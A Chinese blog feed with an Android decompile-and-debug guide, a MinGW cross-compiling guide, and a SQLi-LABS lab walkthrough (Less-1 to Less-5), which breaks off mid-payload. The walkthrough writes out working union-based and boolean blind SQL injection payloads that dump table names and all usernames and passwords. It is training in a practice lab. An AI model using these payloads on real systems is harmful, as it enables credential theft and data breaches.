class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onCreate</span><span class="params">(savedInstanceState: <span class="type">Bundle</span>?)</span></span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState)</span><br><span class="line">        setContentView(R.layout.activity_main)</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 根据id找到应用的应用栏并设置点击事件，点击后显示Hello World!的提示。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        findViewById&lt;View&gt;(R.id.action_bar).setOnClickListener &#123;</span><br><span class="line">            Toast.makeText(<span class="keyword">this</span>, <span class="string">&quot;Hello World!&quot;</span>, Toast.LENGTH_SHORT).show()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="构建项目"><a href="#构建项目" class="headerlink" title="构建项目"></a>构建项目</h2><p><img src="/../../images/IntelliJ-IDEA-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95Android%E5%BA%94%E7%94%A8/2022-04-06-19-07-22-image.png"></p><ul><li>构建完成。</li></ul><p><img src="/../../images/IntelliJ-IDEA-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95Android%E5%BA%94%E7%94%A8/2022-04-06-20-24-36-image.png"></p><h2 id="反编译应用"><a href="#反编译应用" class="headerlink" title="反编译应用"></a>反编译应用</h2><ul><li>在终端打开。</li></ul><p><img src="/../../images/IntelliJ-IDEA-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95Android%E5%BA%94%E7%94%A8/2022-04-06-20-25-21-image.png"></p><ul><li>使用<code>apktool</code>。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(webb㉿kali)-[~/…/build/outputs/apk/debug]</span><br><span class="line">└─$ apktool d app-debug.apk       </span><br><span class="line">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=<span class="literal">true</span></span><br><span class="line">I: Using Apktool 2.5.0-dirty on app-debug.apk</span><br><span class="line">I: Loading resource table...</span><br><span class="line">I: Decoding AndroidManifest.xml with resources...</span><br><span class="line">I: Loading resource table from file: /home/webb/.local/share/apktool/framework/1.apk</span><br><span class="line">I: Regular manifest package...</span><br><span class="line">I: Decoding file-resources...</span><br><span class="line">I: Decoding values */* XMLs...</span><br><span class="line">I: Baksmaling classes.dex...</span><br><span class="line">I: Baksmaling classes3.dex...</span><br><span class="line">I: Baksmaling classes2.dex...</span><br><span class="line">I: Copying assets and libs...</span><br><span class="line">I: Copying unknown files...</span><br><span class="line">I: Copying original files...</span><br></pre></td></tr></table></figure><ul><li>如果没有<code>apktool</code>就使用<code>sudo apt-get install apktool -y</code>。</li></ul><h2 id="打开反编译完成的项目"><a href="#打开反编译完成的项目" class="headerlink" title="打开反编译完成的项目"></a>打开反编译完成的项目</h2><ul><li>打开项目。</li></ul><p><img src="/../../images/IntelliJ-IDEA-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95Android%E5%BA%94%E7%94%A8/2022-04-06-20-09-55-image.png"></p><ul><li>配置Android框架。</li></ul><p><img src="/../../images/IntelliJ-IDEA-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95Android%E5%BA%94%E7%94%A8/2022-04-06-20-12-54-image.png"></p><h2 id="配置调试功能"><a href="#配置调试功能" class="headerlink" title="配置调试功能"></a>配置调试功能</h2><ul><li>找到需要调试的文件。</li></ul><p><img src="/../../images/IntelliJ-IDEA-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95Android%E5%BA%94%E7%94%A8/2022-04-06-20-13-55-image.png"></p><ul><li>找到需要调试的代码。</li></ul><p><img src="/../../images/IntelliJ-IDEA-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95Android%E5%BA%94%E7%94%A8/2022-04-06-20-15-20-image.png"></p><ul><li>使用IntelliJ IDEA的调试功能。</li></ul><p><img src="/../../images/IntelliJ-IDEA-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95Android%E5%BA%94%E7%94%A8/2022-04-06-20-18-04-image.png"></p><ul><li>调试功能开启完成。</li></ul><p><img src="/../../images/IntelliJ-IDEA-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95Android%E5%BA%94%E7%94%A8/2022-04-06-20-18-37-image.png"></p><h2 id="开始调试"><a href="#开始调试" class="headerlink" title="开始调试"></a>开始调试</h2><ul><li>启动软件。</li></ul><p><img src="/../../images/IntelliJ-IDEA-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95Android%E5%BA%94%E7%94%A8/2022-04-06-20-21-44-image.png"></p><ul><li>点击应用栏触发代码和触发调试功能。</li></ul><p><img src="/../../images/IntelliJ-IDEA-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95Android%E5%BA%94%E7%94%A8/2022-04-06-20-22-48-image.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;打开IntelliJ-IDEA&quot;&gt;&lt;a href=&quot;#打开IntelliJ-IDEA&quot; class=&quot;headerlink&quot; title=&quot;打开IntelliJ IDEA&quot;&gt;&lt;/a&gt;打开IntelliJ IDEA&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/../../i</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Linux C C++ 交叉编程</title>
    <link href="http://webb-l.top/2022/04/02/Linux/%E4%BA%A4%E5%8F%89%E7%BC%96%E7%A8%8B/"/>
    <id>http://webb-l.top/2022/04/02/Linux/%E4%BA%A4%E5%8F%89%E7%BC%96%E7%A8%8B/</id>
    <published>2022-04-01T16:00:00.000Z</published>
    <updated>2022-04-02T14:21:36.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h3><ul><li>安装MinGW-w64</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc-mingw-w64</span><br></pre></td></tr></table></figure><ul><li>MinGW-w64使用。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># C</span></span><br><span class="line">i686-w64-mingw32-gcc-win32 main.c -o main.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># C++</span></span><br><span class="line">i686-w64-mingw32-c++-win32 main.cpp -o main.exe</span><br></pre></td></tr></table></figure><h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><ul><li>这里我利用Clion创建一个C++的项目。</li></ul><p><img src="/../../images/Linux%E4%BA%A4%E5%8F%89%E7%BC%96%E7%A8%8B/create.png" alt="create.png"></p><ul><li>修改<code>CMakeLists.txt</code>文件的内容。</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">cmake_minimum_required(VERSION 3.21)</span><br><span class="line">project(hello_world)</span><br><span class="line"></span><br><span class="line">set(CMAKE_CXX_STANDARD 14)</span><br><span class="line"></span><br><span class="line">add_executable(hello_world main.cpp)</span><br><span class="line"></span><br><span class="line"># 设置交叉编译的目标操作为windows</span><br><span class="line">SET(CMAKE_SYSTEM_NAME Windows)</span><br><span class="line"># 指定c/c++编译器</span><br><span class="line">SET(CMAKE_C_COMPILER i686-w64-mingw32-gcc)</span><br><span class="line">SET(CMAKE_CXX_COMPILER i686-w64-mingw32-g++)</span><br><span class="line">SET(CMAKE_RC_COMPILER i686-w64-mingw32-windres)</span><br><span class="line"># 指定编译目标操作系统版本时的搜索根路径</span><br><span class="line">SET(CMAKE_FIND_ROOT_PATH /usr/i686-w64-mingw32)</span><br><span class="line"></span><br><span class="line"># adjust the default behaviour of the FIND_XXX() commands:</span><br><span class="line"># search headers and libraries in the target environment, search</span><br><span class="line"># programs in the host environment</span><br><span class="line">set(CMAKE_FIND_ROOT_PATH_MODE_PROGRAM NEVER)</span><br><span class="line">set(CMAKE_FIND_ROOT_PATH_MODE_LIBRARY ONLY)</span><br><span class="line">set(CMAKE_FIND_ROOT_PATH_MODE_INCLUDE ONLY)</span><br><span class="line"># 解决找不到libstdc++-6.dll</span><br><span class="line">set(CMAKE_EXE_LINKER_FLAGS &quot;-static-libgcc -static-libstdc++&quot;)</span><br></pre></td></tr></table></figure><ul><li>点击<code>重新加载变更</code>或者<code>启用自动重新加载</code>。</li></ul><p><img src="/../../images/Linux%E4%BA%A4%E5%8F%89%E7%BC%96%E7%A8%8B/reload.png" alt="reload.png"></p><ul><li>点击<strong>构建</strong>然后选择<strong>构建‘项目名称’</strong></li></ul><p><img src="/../../images/Linux%E4%BA%A4%E5%8F%89%E7%BC%96%E7%A8%8B/build.png" alt="build.png"></p><ul><li>构建完成之后打开<strong>cmake-build-debug</strong>文件夹下面会生成exe文件。</li></ul><p><img src="/../../images/Linux%E4%BA%A4%E5%8F%89%E7%BC%96%E7%A8%8B/build_finish.png" alt="build_finish.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;配置环境&quot;&gt;&lt;a href=&quot;#配置环境&quot; class=&quot;headerlink&quot; title=&quot;配置环境&quot;&gt;&lt;/a&gt;配置环境&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;安装MinGW-w64&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;t</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SQLi-LABS</title>
    <link href="http://webb-l.top/2021/10/26/SQL/SQLi-LABS/"/>
    <id>http://webb-l.top/2021/10/26/SQL/SQLi-LABS/</id>
    <published>2021-10-25T16:00:00.000Z</published>
    <updated>2022-04-06T06:08:20.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Less-1-基于错误的字符串"><a href="#Less-1-基于错误的字符串" class="headerlink" title="Less-1  基于错误的字符串"></a>Less-1  基于错误的字符串</h2><ul><li>首先找到注入点，打开首页提示我们要输入一个ID带数值的参数。</li><li>这里我输入id&#x3D;1就返回下列内容。</li></ul><p><img src="/../../images/SQLi-LABS/image-20210922211256357.png" alt="image-20210922211256357"></p><ul><li>因为这网页的标题是基于错误的字符串注入，这里我们尝试在<code>?id=1&#39;</code>后面添加一个单引号。</li><li>然后就返回了错误消息。</li></ul><p><img src="/../../images/SQLi-LABS/image-20210922211216216.png" alt="image-20210922211216216"></p><ul><li>从这里的信息我们可以推断出SQL语句。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 这是我们假设的<span class="keyword">SQL</span>语句。</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure><ul><li>现在我们就可以构建Payload。</li><li>使用下列语句，尝试是否可以注入。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or &#x27;</span></span><br></pre></td></tr></table></figure><ul><li>结果发现是可以注入SQL语句。</li></ul><p><img src="/../../images/SQLi-LABS/image-20210922211632148.png" alt="image-20210922211632148"></p><ul><li>接下来我们需要拆字段数量。这里我们使用<code>order by </code>语句查询。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># <span class="comment">--+ 是注释掉后面的 limit 0,1 语句</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 8 --+</span></span><br></pre></td></tr></table></figure><ul><li>我们使用二分法来使用8发现报错了。</li></ul><p><img src="/../../images/SQLi-LABS/image-20210922212043154.png" alt="image-20210922212043154"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 错误</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 8 --+ </span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span> <span class="comment">--+ </span></span><br><span class="line"># 正确</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 2 --+ </span></span><br><span class="line"><span class="string"># 正确</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span> <span class="comment">--+ </span></span><br></pre></td></tr></table></figure><ul><li>最终发现该查询有三个字段名，假设SQL语句为：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id, name, password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span> limit <span class="number">0</span>, <span class="number">1</span>;</span><br></pre></td></tr></table></figure><ul><li>使用<code>union select</code>语句尝试这三个字段名，是否在页面显示。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="string">&#x27; union select 1,2,3 --+</span></span><br></pre></td></tr></table></figure><ul><li>发现只显示了2和3，1并没有显示出来。</li></ul><p><img src="/../../images/SQLi-LABS/image-20210922212755277.png" alt="image-20210922212755277"></p><ul><li>接下来尝试在2和3这里进行注入。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 在<span class="number">2</span>的位置获取当前数据库名。</span><br><span class="line"># 在<span class="number">3</span>的位置获取当前数据库用户名。</span><br><span class="line">?id<span class="operator">=</span><span class="string">&#x27; union select 1, database(), user() --+</span></span><br></pre></td></tr></table></figure><p><img src="/../../images/SQLi-LABS/image-20210922213025200.png" alt="image-20210922213025200"></p><ul><li>这里使用的数据库名为”<strong>security</strong>“，新增我们尝试获取该数据中所有表名。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 如果不使用group_concat()函数会导致错误。</span><br><span class="line">?id<span class="operator">=</span><span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = database()),user() --+</span></span><br></pre></td></tr></table></figure><ul><li>这里查出来了<code>authors,emails,referers,uagents,users</code>五个表。</li></ul><p><img src="/../../images/SQLi-LABS/image-20210922214305778.png" alt="image-20210922214305778"></p><ul><li>使用下列语句查询出某个表中的列名数量，这里我们尝试获取<code>users</code>表的列数。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="string">&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = &#x27;</span>users<span class="string">&#x27;),user() --+</span></span><br></pre></td></tr></table></figure><ul><li>查询结果了<code>id,username,password</code>三个列。</li></ul><p><img src="/../../images/SQLi-LABS/image-20210922214651869.png" alt="image-20210922214651869"></p><ul><li>最后查询出表中的所有数据。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 如果你不是在靶场环境我不建议你直接查询某个表中的所有数据，建议加上limit语句。</span><br><span class="line">?id<span class="operator">=</span><span class="string">&#x27; union select 1,(select group_concat(username) from users),(select group_concat(password) from users) --+</span></span><br></pre></td></tr></table></figure><p><img src="/../../images/SQLi-LABS/image-20210922215200093.png" alt="image-20210922215200093"></p><ul><li>你可以使用上面的语句去获取其他表中的数据。</li></ul><h2 id="Less-2-基于错误的整数"><a href="#Less-2-基于错误的整数" class="headerlink" title="Less-2 基于错误的整数"></a>Less-2 基于错误的整数</h2><ul><li>在Less-1中我们已经找到了注入Less-2也是一样。</li><li>首先我们假设该查询语句为：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, column2, column3 <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> $id limit <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure><ul><li>Less-1我们已经把列名和列数量获取到了。</li><li>可以使用只有下列payload进行注入：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),(<span class="keyword">select</span> group_concat(password) <span class="keyword">from</span> users) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="/../../images/SQLi-LABS/image-20210923192840979.png" alt="image-20210923192840979"></p><h2 id="Less-3-基于错误的字符串（扭曲）"><a href="#Less-3-基于错误的字符串（扭曲）" class="headerlink" title="Less-3  基于错误的字符串（扭曲）"></a>Less-3  基于错误的字符串（扭曲）</h2><ul><li>在id后面添加单引号发现出现错误。这里的错误有点区别。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27;</span> <span class="keyword">at</span> line <span class="number">1</span></span><br><span class="line"><span class="operator">/</span>Less<span class="number">-3</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27;) LIMIT 0,1&#x27;</span> <span class="keyword">at</span> line <span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/../../images/SQLi-LABS/image-20210923193545135.png" alt="image-20210923193545135"></p><ul><li>发现多了<code>)</code>括号。我们可以假设该语句为：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, column2, column3 <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> (<span class="string">&#x27;$id&#x27;</span>) limit <span class="number">0</span>, <span class="number">1</span>;</span><br></pre></td></tr></table></figure><ul><li>由于Less-1，我们已经猜出列名和列数量。我们可以执行使用查询<code>users</code>表的数据。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="string">&#x27;) union select 1,(select group_concat(username) from users),(select group_concat(password) from users) --+</span></span><br></pre></td></tr></table></figure><p><img src="/../../images/SQLi-LABS/image-20210923194821023.png" alt="image-20210923194821023"></p><h2 id="Less-4-基于错误的双引号字符串"><a href="#Less-4-基于错误的双引号字符串" class="headerlink" title="Less-4 基于错误的双引号字符串"></a>Less-4 基于错误的双引号字符串</h2><ul><li>这里提示我们要使用**”**双引号。使用双引号以后就出现了错误。</li></ul><p><img src="/../../images/SQLi-LABS/image-20210923195939937.png" alt="image-20210923195939937"></p><ul><li>根据错误信息我们可以推断出该SQL语句为：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, column2, column3 <span class="keyword">from</span> <span class="keyword">where</span> id <span class="operator">=</span> (&quot;$id&quot;) limit <span class="number">0</span>, <span class="number">1</span>;  </span><br></pre></td></tr></table></figure><ul><li>进过尝试以后我们发现，可以进行注入。现在我们要把数据都用户名和密码都查出来：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span>&quot;) union select 1,(select group_concat(username) from users),(select group_concat(password) from users) --+</span><br></pre></td></tr></table></figure><p><img src="/../../images/SQLi-LABS/image-20210923203205746.png" alt="image-20210923203205746"></p><h2 id="Less-5-双查询单引号字符串"><a href="#Less-5-双查询单引号字符串" class="headerlink" title="Less-5  双查询单引号字符串"></a>Less-5  双查询单引号字符串</h2><ul><li>首先使用单引号测试出现错误。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 错误内容</span><br><span class="line">You have an error <span class="keyword">in</span> your <span class="keyword">SQL</span> syntax; <span class="keyword">check</span> the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;&#x27;</span><span class="number">15</span><span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; at line 1</span></span><br></pre></td></tr></table></figure><ul><li>根据错误信息可以推断出：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column1, column2, column3 <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span> limit <span class="number">1</span>, <span class="number">0</span>;</span><br></pre></td></tr></table></figure><ul><li>我们可以使用Less-1的SQL来进行获取数据。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span></span><br><span class="line"># 没有返回数据。</span><br><span class="line">?id<span class="operator">=</span><span class="string">&#x27; union select 1,(select group_concat(username) from users),(select group_concat(password) from users) --+</span></span><br><span class="line"><span class="string"># 页面返回</span></span><br><span class="line"><span class="string">You are in...........</span></span><br></pre></td></tr></table></figure><ul><li>首先查询数据的长度：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># 成功</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(length((select group_concat(username) from users))&gt;=8,1,0) --+</span></span><br><span class="line"><span class="string"># 成功</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(length((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users))<span class="operator">&gt;=</span><span class="number">16</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line"># 成功</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(length((select group_concat(username) from users))&gt;=32,1,0) --+</span></span><br><span class="line"><span class="string"># 成功</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(length((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users))<span class="operator">&gt;=</span><span class="number">64</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line"># 错误</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(length((select group_concat(username) from users))&lt;=128,1,0) --+</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(length((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users))<span class="operator">&lt;=</span><span class="number">96</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line"># 正确</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(length((select group_concat(username) from users))&lt;=80,1,0) --+</span></span><br><span class="line"><span class="string"># 正确</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(length((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users))<span class="operator">&lt;=</span><span class="number">88</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line"># 错误</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(length((select group_concat(username) from users))&lt;=92,1,0) --+</span></span><br><span class="line"><span class="string"># 正确</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(length((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users))<span class="operator">&lt;=</span><span class="number">90</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line"># 正确</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(length((select group_concat(username) from users))&lt;=91,1,0) --+</span></span><br></pre></td></tr></table></figure><ul><li>使用下列语句查询数据：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 查询第一位数据</span><br><span class="line"># 错误</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(substr((select group_concat(username) from users),1,1)=&#x27;</span>a<span class="string">&#x27;,1,0) --+</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;b&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line">...</span><br><span class="line"># 正确</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(substr((select group_concat(username) from users),1,1)=&#x27;</span>d<span class="string">&#x27;,1,0) --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查询第二位数据</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="comment">--+</span></span><br><span class="line"># 错误</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=if(substr((select group_concat(username) from users),2,1)=&#x27;</span>b<span class="string">&#x27;,1,0) --+</span></span><br><span class="line"><span class="string"># 错误</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>if(substr((<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> users),<span 